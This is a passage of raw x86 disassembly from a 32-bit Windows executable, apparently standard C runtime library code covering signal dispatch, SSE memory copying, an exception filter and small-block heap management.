  404759:	e8 f7 d8 ff ff       	call   0x402055
  40475e:	59                   	pop    %ecx
  40475f:	a3 5c d5 40 00       	mov    %eax,0x40d55c
  404764:	c3                   	ret
  404765:	8b 44 24 04          	mov    0x4(%esp),%eax
  404769:	a3 60 d5 40 00       	mov    %eax,0x40d560
  40476e:	a3 64 d5 40 00       	mov    %eax,0x40d564
  404773:	a3 68 d5 40 00       	mov    %eax,0x40d568
  404778:	a3 6c d5 40 00       	mov    %eax,0x40d56c
  40477d:	c3                   	ret
  40477e:	8b 44 24 04          	mov    0x4(%esp),%eax
  404782:	8b 0d 1c c8 40 00    	mov    0x40c81c,%ecx
  404788:	56                   	push   %esi
  404789:	39 50 04             	cmp    %edx,0x4(%eax)
  40478c:	74 10                	je     0x40479e
  40478e:	8b f1                	mov    %ecx,%esi
  404790:	6b f6 0c             	imul   $0xc,%esi,%esi
  404793:	03 74 24 08          	add    0x8(%esp),%esi
  404797:	83 c0 0c             	add    $0xc,%eax
  40479a:	3b c6                	cmp    %esi,%eax
  40479c:	72 eb                	jb     0x404789
  40479e:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  4047a1:	03 4c 24 08          	add    0x8(%esp),%ecx
  4047a5:	5e                   	pop    %esi
  4047a6:	3b c1                	cmp    %ecx,%eax
  4047a8:	73 05                	jae    0x4047af
  4047aa:	39 50 04             	cmp    %edx,0x4(%eax)
  4047ad:	74 02                	je     0x4047b1
  4047af:	33 c0                	xor    %eax,%eax
  4047b1:	c3                   	ret
  4047b2:	ff 35 68 d5 40 00    	push   0x40d568
  4047b8:	e8 0f d9 ff ff       	call   0x4020cc
  4047bd:	59                   	pop    %ecx
  4047be:	c3                   	ret
  4047bf:	6a 20                	push   $0x20
  4047c1:	68 30 af 40 00       	push   $0x40af30
  4047c6:	e8 89 f7 ff ff       	call   0x403f54
  4047cb:	33 ff                	xor    %edi,%edi
  4047cd:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4047d0:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4047d3:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4047d6:	83 fb 0b             	cmp    $0xb,%ebx
  4047d9:	7f 4c                	jg     0x404827
  4047db:	74 15                	je     0x4047f2
  4047dd:	8b c3                	mov    %ebx,%eax
  4047df:	6a 02                	push   $0x2
  4047e1:	59                   	pop    %ecx
  4047e2:	2b c1                	sub    %ecx,%eax
  4047e4:	74 22                	je     0x404808
  4047e6:	2b c1                	sub    %ecx,%eax
  4047e8:	74 08                	je     0x4047f2
  4047ea:	2b c1                	sub    %ecx,%eax
  4047ec:	74 64                	je     0x404852
  4047ee:	2b c1                	sub    %ecx,%eax
  4047f0:	75 44                	jne    0x404836
  4047f2:	e8 7a da ff ff       	call   0x402271
  4047f7:	8b f8                	mov    %eax,%edi
  4047f9:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4047fc:	85 ff                	test   %edi,%edi
  4047fe:	75 14                	jne    0x404814
  404800:	83 c8 ff             	or     $0xffffffff,%eax
  404803:	e9 61 01 00 00       	jmp    0x404969
  404808:	be 60 d5 40 00       	mov    $0x40d560,%esi
  40480d:	a1 60 d5 40 00       	mov    0x40d560,%eax
  404812:	eb 60                	jmp    0x404874
  404814:	ff 77 5c             	push   0x5c(%edi)
  404817:	8b d3                	mov    %ebx,%edx
  404819:	e8 60 ff ff ff       	call   0x40477e
  40481e:	8b f0                	mov    %eax,%esi
  404820:	83 c6 08             	add    $0x8,%esi
  404823:	8b 06                	mov    (%esi),%eax
  404825:	eb 5a                	jmp    0x404881
  404827:	8b c3                	mov    %ebx,%eax
  404829:	83 e8 0f             	sub    $0xf,%eax
  40482c:	74 3c                	je     0x40486a
  40482e:	83 e8 06             	sub    $0x6,%eax
  404831:	74 2b                	je     0x40485e
  404833:	48                   	dec    %eax
  404834:	74 1c                	je     0x404852
  404836:	e8 f2 fb ff ff       	call   0x40442d
  40483b:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404841:	33 c0                	xor    %eax,%eax
  404843:	50                   	push   %eax
  404844:	50                   	push   %eax
  404845:	50                   	push   %eax
  404846:	50                   	push   %eax
  404847:	50                   	push   %eax
  404848:	e8 ad c9 ff ff       	call   0x4011fa
  40484d:	83 c4 14             	add    $0x14,%esp
  404850:	eb ae                	jmp    0x404800
  404852:	be 68 d5 40 00       	mov    $0x40d568,%esi
  404857:	a1 68 d5 40 00       	mov    0x40d568,%eax
  40485c:	eb 16                	jmp    0x404874
  40485e:	be 64 d5 40 00       	mov    $0x40d564,%esi
  404863:	a1 64 d5 40 00       	mov    0x40d564,%eax
  404868:	eb 0a                	jmp    0x404874
  40486a:	be 6c d5 40 00       	mov    $0x40d56c,%esi
  40486f:	a1 6c d5 40 00       	mov    0x40d56c,%eax
  404874:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  40487b:	50                   	push   %eax
  40487c:	e8 4b d8 ff ff       	call   0x4020cc
  404881:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404884:	59                   	pop    %ecx
  404885:	33 c0                	xor    %eax,%eax
  404887:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  40488b:	0f 84 d8 00 00 00    	je     0x404969
  404891:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  404894:	75 07                	jne    0x40489d
  404896:	6a 03                	push   $0x3
  404898:	e8 a9 df ff ff       	call   0x402846
  40489d:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  4048a0:	74 07                	je     0x4048a9
  4048a2:	50                   	push   %eax
  4048a3:	e8 d6 ea ff ff       	call   0x40337e
  4048a8:	59                   	pop    %ecx
  4048a9:	33 c0                	xor    %eax,%eax
  4048ab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4048ae:	83 fb 08             	cmp    $0x8,%ebx
  4048b1:	74 0a                	je     0x4048bd
  4048b3:	83 fb 0b             	cmp    $0xb,%ebx
  4048b6:	74 05                	je     0x4048bd
  4048b8:	83 fb 04             	cmp    $0x4,%ebx
  4048bb:	75 1b                	jne    0x4048d8
  4048bd:	8b 4f 60             	mov    0x60(%edi),%ecx
  4048c0:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4048c3:	89 47 60             	mov    %eax,0x60(%edi)
  4048c6:	83 fb 08             	cmp    $0x8,%ebx
  4048c9:	75 40                	jne    0x40490b
  4048cb:	8b 4f 64             	mov    0x64(%edi),%ecx
  4048ce:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4048d1:	c7 47 64 8c 00 00 00 	movl   $0x8c,0x64(%edi)
  4048d8:	83 fb 08             	cmp    $0x8,%ebx
  4048db:	75 2e                	jne    0x40490b
  4048dd:	8b 0d 10 c8 40 00    	mov    0x40c810,%ecx
  4048e3:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4048e6:	8b 0d 14 c8 40 00    	mov    0x40c814,%ecx
  4048ec:	8b 15 10 c8 40 00    	mov    0x40c810,%edx
  4048f2:	03 ca                	add    %edx,%ecx
  4048f4:	39 4d dc             	cmp    %ecx,-0x24(%ebp)
  4048f7:	7d 19                	jge    0x404912
  4048f9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4048fc:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  4048ff:	8b 57 5c             	mov    0x5c(%edi),%edx
  404902:	89 44 11 08          	mov    %eax,0x8(%ecx,%edx,1)
  404906:	ff 45 dc             	incl   -0x24(%ebp)
  404909:	eb db                	jmp    0x4048e6
  40490b:	e8 b3 d7 ff ff       	call   0x4020c3
  404910:	89 06                	mov    %eax,(%esi)
  404912:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404919:	e8 15 00 00 00       	call   0x404933
  40491e:	83 fb 08             	cmp    $0x8,%ebx
  404921:	75 1f                	jne    0x404942
  404923:	ff 77 64             	push   0x64(%edi)
  404926:	53                   	push   %ebx
  404927:	ff 55 e0             	call   *-0x20(%ebp)
  40492a:	59                   	pop    %ecx
  40492b:	eb 19                	jmp    0x404946
  40492d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404930:	8b 7d d8             	mov    -0x28(%ebp),%edi
  404933:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  404937:	74 08                	je     0x404941
  404939:	6a 00                	push   $0x0
  40493b:	e8 66 e9 ff ff       	call   0x4032a6
  404940:	59                   	pop    %ecx
  404941:	c3                   	ret
  404942:	53                   	push   %ebx
  404943:	ff 55 e0             	call   *-0x20(%ebp)
  404946:	59                   	pop    %ecx
  404947:	83 fb 08             	cmp    $0x8,%ebx
  40494a:	74 0a                	je     0x404956
  40494c:	83 fb 0b             	cmp    $0xb,%ebx
  40494f:	74 05                	je     0x404956
  404951:	83 fb 04             	cmp    $0x4,%ebx
  404954:	75 11                	jne    0x404967
  404956:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404959:	89 47 60             	mov    %eax,0x60(%edi)
  40495c:	83 fb 08             	cmp    $0x8,%ebx
  40495f:	75 06                	jne    0x404967
  404961:	8b 45 d0             	mov    -0x30(%ebp),%eax
  404964:	89 47 64             	mov    %eax,0x64(%edi)
  404967:	33 c0                	xor    %eax,%eax
  404969:	e8 2b f6 ff ff       	call   0x403f99
  40496e:	c3                   	ret
  40496f:	8b 44 24 04          	mov    0x4(%esp),%eax
  404973:	a3 74 d5 40 00       	mov    %eax,0x40d574
  404978:	c3                   	ret
  404979:	8b 44 24 04          	mov    0x4(%esp),%eax
  40497d:	a3 80 d5 40 00       	mov    %eax,0x40d580
  404982:	c3                   	ret
  404983:	8b 44 24 04          	mov    0x4(%esp),%eax
  404987:	a3 84 d5 40 00       	mov    %eax,0x40d584
  40498c:	c3                   	ret
  40498d:	ff 74 24 04          	push   0x4(%esp)
  404991:	ff 15 08 91 40 00    	call   *0x409108
  404997:	33 c0                	xor    %eax,%eax
  404999:	40                   	inc    %eax
  40499a:	c2 08 00             	ret    $0x8
  40499d:	6a 14                	push   $0x14
  40499f:	68 50 af 40 00       	push   $0x40af50
  4049a4:	e8 ab f5 ff ff       	call   0x403f54
  4049a9:	33 ff                	xor    %edi,%edi
  4049ab:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4049ae:	ff 35 84 d5 40 00    	push   0x40d584
  4049b4:	e8 13 d7 ff ff       	call   0x4020cc
  4049b9:	59                   	pop    %ecx
  4049ba:	8b f0                	mov    %eax,%esi
  4049bc:	3b f7                	cmp    %edi,%esi
  4049be:	75 53                	jne    0x404a13
  4049c0:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4049c3:	50                   	push   %eax
  4049c4:	e8 85 dc ff ff       	call   0x40264e
  4049c9:	59                   	pop    %ecx
  4049ca:	3b c7                	cmp    %edi,%eax
  4049cc:	74 0d                	je     0x4049db
  4049ce:	57                   	push   %edi
  4049cf:	57                   	push   %edi
  4049d0:	57                   	push   %edi
  4049d1:	57                   	push   %edi
  4049d2:	57                   	push   %edi
  4049d3:	e8 32 c7 ff ff       	call   0x40110a
  4049d8:	83 c4 14             	add    $0x14,%esp
  4049db:	83 7d e4 01          	cmpl   $0x1,-0x1c(%ebp)
  4049df:	74 21                	je     0x404a02
  4049e1:	68 6c 9b 40 00       	push   $0x409b6c
  4049e6:	ff 15 a0 90 40 00    	call   *0x4090a0
  4049ec:	3b c7                	cmp    %edi,%eax
  4049ee:	74 12                	je     0x404a02
  4049f0:	68 44 9b 40 00       	push   $0x409b44
  4049f5:	50                   	push   %eax
  4049f6:	ff 15 48 90 40 00    	call   *0x409048
  4049fc:	8b f0                	mov    %eax,%esi
  4049fe:	3b f7                	cmp    %edi,%esi
  404a00:	75 05                	jne    0x404a07
  404a02:	be 8d 49 40 00       	mov    $0x40498d,%esi
  404a07:	56                   	push   %esi
  404a08:	e8 48 d6 ff ff       	call   0x402055
  404a0d:	59                   	pop    %ecx
  404a0e:	a3 84 d5 40 00       	mov    %eax,0x40d584
  404a13:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404a16:	ff 75 0c             	push   0xc(%ebp)
  404a19:	ff 75 08             	push   0x8(%ebp)
  404a1c:	ff d6                	call   *%esi
  404a1e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404a21:	eb 2f                	jmp    0x404a52
  404a23:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404a26:	8b 00                	mov    (%eax),%eax
  404a28:	8b 00                	mov    (%eax),%eax
  404a2a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404a2d:	33 c9                	xor    %ecx,%ecx
  404a2f:	3d 17 00 00 c0       	cmp    $0xc0000017,%eax
  404a34:	0f 94 c1             	sete   %cl
  404a37:	8b c1                	mov    %ecx,%eax
  404a39:	c3                   	ret
  404a3a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404a3d:	81 7d dc 17 00 00 c0 	cmpl   $0xc0000017,-0x24(%ebp)
  404a44:	75 08                	jne    0x404a4e
  404a46:	6a 08                	push   $0x8
  404a48:	ff 15 b8 90 40 00    	call   *0x4090b8
  404a4e:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  404a52:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404a59:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404a5c:	e8 38 f5 ff ff       	call   0x403f99
  404a61:	c3                   	ret
  404a62:	8b 44 24 04          	mov    0x4(%esp),%eax
  404a66:	a3 88 d5 40 00       	mov    %eax,0x40d588
  404a6b:	c3                   	ret
  404a6c:	ff 35 88 d5 40 00    	push   0x40d588
  404a72:	e8 55 d6 ff ff       	call   0x4020cc
  404a77:	85 c0                	test   %eax,%eax
  404a79:	59                   	pop    %ecx
  404a7a:	74 0f                	je     0x404a8b
  404a7c:	ff 74 24 04          	push   0x4(%esp)
  404a80:	ff d0                	call   *%eax
  404a82:	85 c0                	test   %eax,%eax
  404a84:	59                   	pop    %ecx
  404a85:	74 04                	je     0x404a8b
  404a87:	33 c0                	xor    %eax,%eax
  404a89:	40                   	inc    %eax
  404a8a:	c3                   	ret
  404a8b:	33 c0                	xor    %eax,%eax
  404a8d:	c3                   	ret
  404a8e:	55                   	push   %ebp
  404a8f:	8b ec                	mov    %esp,%ebp
  404a91:	83 ec 08             	sub    $0x8,%esp
  404a94:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404a97:	89 75 f8             	mov    %esi,-0x8(%ebp)
  404a9a:	8b 75 0c             	mov    0xc(%ebp),%esi
  404a9d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404aa0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404aa3:	c1 e9 07             	shr    $0x7,%ecx
  404aa6:	eb 06                	jmp    0x404aae
  404aa8:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404aae:	66 0f 6f 06          	movdqa (%esi),%xmm0
  404ab2:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  404ab7:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  404abc:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  404ac1:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  404ac5:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  404aca:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  404acf:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  404ad4:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  404ad9:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  404ade:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  404ae3:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  404ae8:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  404aed:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  404af2:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  404af7:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  404afc:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  404b02:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  404b08:	49                   	dec    %ecx
  404b09:	75 a3                	jne    0x404aae
  404b0b:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404b0e:	8b 7d fc             	mov    -0x4(%ebp),%edi
  404b11:	8b e5                	mov    %ebp,%esp
  404b13:	5d                   	pop    %ebp
  404b14:	c3                   	ret
  404b15:	55                   	push   %ebp
  404b16:	8b ec                	mov    %esp,%ebp
  404b18:	83 ec 1c             	sub    $0x1c,%esp
  404b1b:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404b1e:	89 75 f8             	mov    %esi,-0x8(%ebp)
  404b21:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404b24:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404b27:	8b c3                	mov    %ebx,%eax
  404b29:	99                   	cltd
  404b2a:	8b c8                	mov    %eax,%ecx
  404b2c:	8b 45 08             	mov    0x8(%ebp),%eax
  404b2f:	33 ca                	xor    %edx,%ecx
  404b31:	2b ca                	sub    %edx,%ecx
  404b33:	83 e1 0f             	and    $0xf,%ecx
  404b36:	33 ca                	xor    %edx,%ecx
  404b38:	2b ca                	sub    %edx,%ecx
  404b3a:	99                   	cltd
  404b3b:	8b f8                	mov    %eax,%edi
  404b3d:	33 fa                	xor    %edx,%edi
  404b3f:	2b fa                	sub    %edx,%edi
  404b41:	83 e7 0f             	and    $0xf,%edi
  404b44:	33 fa                	xor    %edx,%edi
  404b46:	2b fa                	sub    %edx,%edi
  404b48:	8b d1                	mov    %ecx,%edx
  404b4a:	0b d7                	or     %edi,%edx
  404b4c:	75 4a                	jne    0x404b98
  404b4e:	8b 75 10             	mov    0x10(%ebp),%esi
  404b51:	8b ce                	mov    %esi,%ecx
  404b53:	83 e1 7f             	and    $0x7f,%ecx
  404b56:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  404b59:	3b f1                	cmp    %ecx,%esi
  404b5b:	74 13                	je     0x404b70
  404b5d:	2b f1                	sub    %ecx,%esi
  404b5f:	56                   	push   %esi
  404b60:	53                   	push   %ebx
  404b61:	50                   	push   %eax
  404b62:	e8 27 ff ff ff       	call   0x404a8e
  404b67:	83 c4 0c             	add    $0xc,%esp
  404b6a:	8b 45 08             	mov    0x8(%ebp),%eax
  404b6d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404b70:	85 c9                	test   %ecx,%ecx
  404b72:	74 77                	je     0x404beb
  404b74:	8b 5d 10             	mov    0x10(%ebp),%ebx
  404b77:	8b 55 0c             	mov    0xc(%ebp),%edx
  404b7a:	03 d3                	add    %ebx,%edx
  404b7c:	2b d1                	sub    %ecx,%edx
  404b7e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  404b81:	03 d8                	add    %eax,%ebx
  404b83:	2b d9                	sub    %ecx,%ebx
  404b85:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404b88:	8b 75 ec             	mov    -0x14(%ebp),%esi
  404b8b:	8b 7d f0             	mov    -0x10(%ebp),%edi
  404b8e:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404b91:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404b93:	8b 45 08             	mov    0x8(%ebp),%eax
  404b96:	eb 53                	jmp    0x404beb
  404b98:	3b cf                	cmp    %edi,%ecx
  404b9a:	75 35                	jne    0x404bd1
  404b9c:	f7 d9                	neg    %ecx
  404b9e:	83 c1 10             	add    $0x10,%ecx
  404ba1:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  404ba4:	8b 75 0c             	mov    0xc(%ebp),%esi
  404ba7:	8b 7d 08             	mov    0x8(%ebp),%edi
  404baa:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404bad:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404baf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404bb2:	03 4d e4             	add    -0x1c(%ebp),%ecx
  404bb5:	8b 55 0c             	mov    0xc(%ebp),%edx
  404bb8:	03 55 e4             	add    -0x1c(%ebp),%edx
  404bbb:	8b 45 10             	mov    0x10(%ebp),%eax
  404bbe:	2b 45 e4             	sub    -0x1c(%ebp),%eax
  404bc1:	50                   	push   %eax
  404bc2:	52                   	push   %edx
  404bc3:	51                   	push   %ecx
  404bc4:	e8 4c ff ff ff       	call   0x404b15
  404bc9:	83 c4 0c             	add    $0xc,%esp
  404bcc:	8b 45 08             	mov    0x8(%ebp),%eax
  404bcf:	eb 1a                	jmp    0x404beb
  404bd1:	8b 75 0c             	mov    0xc(%ebp),%esi
  404bd4:	8b 7d 08             	mov    0x8(%ebp),%edi
  404bd7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404bda:	8b d1                	mov    %ecx,%edx
  404bdc:	c1 e9 02             	shr    $0x2,%ecx
  404bdf:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404be1:	8b ca                	mov    %edx,%ecx
  404be3:	83 e1 03             	and    $0x3,%ecx
  404be6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404be8:	8b 45 08             	mov    0x8(%ebp),%eax
  404beb:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  404bee:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404bf1:	8b 7d f4             	mov    -0xc(%ebp),%edi
  404bf4:	8b e5                	mov    %ebp,%esp
  404bf6:	5d                   	pop    %ebp
  404bf7:	c3                   	ret
  404bf8:	6a 0c                	push   $0xc
  404bfa:	68 70 af 40 00       	push   $0x40af70
  404bff:	e8 50 f3 ff ff       	call   0x403f54
  404c04:	6a 0e                	push   $0xe
  404c06:	e8 73 e7 ff ff       	call   0x40337e
  404c0b:	59                   	pop    %ecx
  404c0c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404c10:	8b 75 08             	mov    0x8(%ebp),%esi
  404c13:	8b 4e 04             	mov    0x4(%esi),%ecx
  404c16:	85 c9                	test   %ecx,%ecx
  404c18:	74 2f                	je     0x404c49
  404c1a:	a1 90 d5 40 00       	mov    0x40d590,%eax
  404c1f:	ba 8c d5 40 00       	mov    $0x40d58c,%edx
  404c24:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404c27:	85 c0                	test   %eax,%eax
  404c29:	74 11                	je     0x404c3c
  404c2b:	39 08                	cmp    %ecx,(%eax)
  404c2d:	75 2c                	jne    0x404c5b
  404c2f:	8b 48 04             	mov    0x4(%eax),%ecx
  404c32:	89 4a 04             	mov    %ecx,0x4(%edx)
  404c35:	50                   	push   %eax
  404c36:	e8 54 e0 ff ff       	call   0x402c8f
  404c3b:	59                   	pop    %ecx
  404c3c:	ff 76 04             	push   0x4(%esi)
  404c3f:	e8 4b e0 ff ff       	call   0x402c8f
  404c44:	59                   	pop    %ecx
  404c45:	83 66 04 00          	andl   $0x0,0x4(%esi)
  404c49:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404c50:	e8 0a 00 00 00       	call   0x404c5f
  404c55:	e8 3f f3 ff ff       	call   0x403f99
  404c5a:	c3                   	ret
  404c5b:	8b d0                	mov    %eax,%edx
  404c5d:	eb c5                	jmp    0x404c24
  404c5f:	6a 0e                	push   $0xe
  404c61:	e8 40 e6 ff ff       	call   0x4032a6
  404c66:	59                   	pop    %ecx
  404c67:	c3                   	ret
  404c68:	55                   	push   %ebp
  404c69:	8b ec                	mov    %esp,%ebp
  404c6b:	51                   	push   %ecx
  404c6c:	51                   	push   %ecx
  404c6d:	56                   	push   %esi
  404c6e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404c71:	33 f6                	xor    %esi,%esi
  404c73:	50                   	push   %eax
  404c74:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404c77:	89 75 f8             	mov    %esi,-0x8(%ebp)
  404c7a:	e8 cf d9 ff ff       	call   0x40264e
  404c7f:	85 c0                	test   %eax,%eax
  404c81:	59                   	pop    %ecx
  404c82:	74 0d                	je     0x404c91
  404c84:	56                   	push   %esi
  404c85:	56                   	push   %esi
  404c86:	56                   	push   %esi
  404c87:	56                   	push   %esi
  404c88:	56                   	push   %esi
  404c89:	e8 7c c4 ff ff       	call   0x40110a
  404c8e:	83 c4 14             	add    $0x14,%esp
  404c91:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404c94:	50                   	push   %eax
  404c95:	e8 eb d9 ff ff       	call   0x402685
  404c9a:	85 c0                	test   %eax,%eax
  404c9c:	59                   	pop    %ecx
  404c9d:	74 0d                	je     0x404cac
  404c9f:	56                   	push   %esi
  404ca0:	56                   	push   %esi
  404ca1:	56                   	push   %esi
  404ca2:	56                   	push   %esi
  404ca3:	56                   	push   %esi
  404ca4:	e8 61 c4 ff ff       	call   0x40110a
  404ca9:	83 c4 14             	add    $0x14,%esp
  404cac:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  404cb0:	5e                   	pop    %esi
  404cb1:	75 0b                	jne    0x404cbe
  404cb3:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)
  404cb7:	72 05                	jb     0x404cbe
  404cb9:	33 c0                	xor    %eax,%eax
  404cbb:	40                   	inc    %eax
  404cbc:	c9                   	leave
  404cbd:	c3                   	ret
  404cbe:	6a 03                	push   $0x3
  404cc0:	58                   	pop    %eax
  404cc1:	c9                   	leave
  404cc2:	c3                   	ret
  404cc3:	33 c0                	xor    %eax,%eax
  404cc5:	39 44 24 04          	cmp    %eax,0x4(%esp)
  404cc9:	6a 00                	push   $0x0
  404ccb:	0f 94 c0             	sete   %al
  404cce:	68 00 10 00 00       	push   $0x1000
  404cd3:	50                   	push   %eax
  404cd4:	ff 15 10 91 40 00    	call   *0x409110
  404cda:	85 c0                	test   %eax,%eax
  404cdc:	a3 94 d5 40 00       	mov    %eax,0x40d594
  404ce1:	75 03                	jne    0x404ce6
  404ce3:	33 c0                	xor    %eax,%eax
  404ce5:	c3                   	ret
  404ce6:	e8 7d ff ff ff       	call   0x404c68
  404ceb:	83 f8 03             	cmp    $0x3,%eax
  404cee:	a3 f8 d8 40 00       	mov    %eax,0x40d8f8
  404cf3:	75 24                	jne    0x404d19
  404cf5:	68 f8 03 00 00       	push   $0x3f8
  404cfa:	e8 1e 00 00 00       	call   0x404d1d
  404cff:	85 c0                	test   %eax,%eax
  404d01:	59                   	pop    %ecx
  404d02:	75 15                	jne    0x404d19
  404d04:	ff 35 94 d5 40 00    	push   0x40d594
  404d0a:	ff 15 0c 91 40 00    	call   *0x40910c
  404d10:	83 25 94 d5 40 00 00 	andl   $0x0,0x40d594
  404d17:	eb ca                	jmp    0x404ce3
  404d19:	33 c0                	xor    %eax,%eax
  404d1b:	40                   	inc    %eax
  404d1c:	c3                   	ret
  404d1d:	68 40 01 00 00       	push   $0x140
  404d22:	6a 00                	push   $0x0
  404d24:	ff 35 94 d5 40 00    	push   0x40d594
  404d2a:	ff 15 d0 90 40 00    	call   *0x4090d0
  404d30:	85 c0                	test   %eax,%eax
  404d32:	a3 e4 d8 40 00       	mov    %eax,0x40d8e4
  404d37:	75 01                	jne    0x404d3a
  404d39:	c3                   	ret
  404d3a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404d3e:	83 25 98 d5 40 00 00 	andl   $0x0,0x40d598
  404d45:	83 25 e0 d8 40 00 00 	andl   $0x0,0x40d8e0
  404d4c:	a3 ec d8 40 00       	mov    %eax,0x40d8ec
  404d51:	33 c0                	xor    %eax,%eax
  404d53:	89 0d e8 d8 40 00    	mov    %ecx,0x40d8e8
  404d59:	c7 05 f0 d8 40 00 10 	movl   $0x10,0x40d8f0
  404d60:	00 00 00 
  404d63:	40                   	inc    %eax
  404d64:	c3                   	ret
  404d65:	8b 0d e0 d8 40 00    	mov    0x40d8e0,%ecx
  404d6b:	a1 e4 d8 40 00       	mov    0x40d8e4,%eax
  404d70:	6b c9 14             	imul   $0x14,%ecx,%ecx
  404d73:	03 c8                	add    %eax,%ecx
  404d75:	eb 12                	jmp    0x404d89
  404d77:	8b 54 24 04          	mov    0x4(%esp),%edx
  404d7b:	2b 50 0c             	sub    0xc(%eax),%edx
  404d7e:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  404d84:	72 09                	jb     0x404d8f
  404d86:	83 c0 14             	add    $0x14,%eax
  404d89:	3b c1                	cmp    %ecx,%eax
  404d8b:	72 ea                	jb     0x404d77
  404d8d:	33 c0                	xor    %eax,%eax
  404d8f:	c3                   	ret
  404d90:	55                   	push   %ebp
  404d91:	8b ec                	mov    %esp,%ebp
  404d93:	83 ec 10             	sub    $0x10,%esp
  404d96:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404d99:	8b 41 10             	mov    0x10(%ecx),%eax
  404d9c:	56                   	push   %esi
  404d9d:	8b 75 0c             	mov    0xc(%ebp),%esi
  404da0:	57                   	push   %edi
  404da1:	8b fe                	mov    %esi,%edi
  404da3:	2b 79 0c             	sub    0xc(%ecx),%edi
  404da6:	83 c6 fc             	add    $0xfffffffc,%esi
  404da9:	c1 ef 0f             	shr    $0xf,%edi
  404dac:	8b cf                	mov    %edi,%ecx
  404dae:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  404db4:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  404dbb:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404dbe:	8b 0e                	mov    (%esi),%ecx
  404dc0:	49                   	dec    %ecx
  404dc1:	f6 c1 01             	test   $0x1,%cl
  404dc4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404dc7:	0f 85 d3 02 00 00    	jne    0x4050a0
  404dcd:	53                   	push   %ebx
  404dce:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
